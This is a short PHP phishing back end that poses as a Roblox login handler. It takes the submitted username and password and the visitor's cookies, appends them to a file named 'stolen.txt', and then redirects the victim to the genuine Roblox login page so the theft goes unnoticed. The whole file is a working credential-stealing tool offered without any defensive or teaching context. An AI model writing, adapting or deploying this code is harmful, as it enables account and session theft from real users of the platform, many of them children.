<?php
// Get the username and password from the form
$username = $_POST['username'];
$password = $_POST['password'];
$cookies = $_SERVER['HTTP_COOKIE'];

// Save to a file
$file = fopen('stolen.txt', 'a');
fwrite($file, "Username: $username\n");
fwrite($file, "Password: $password\n");
fwrite($file, "Cookies: $cookies\n\n");
fclose($file);

// Redirect to real Roblox
header('Location: https://www.roblox.com/login');
exit;
>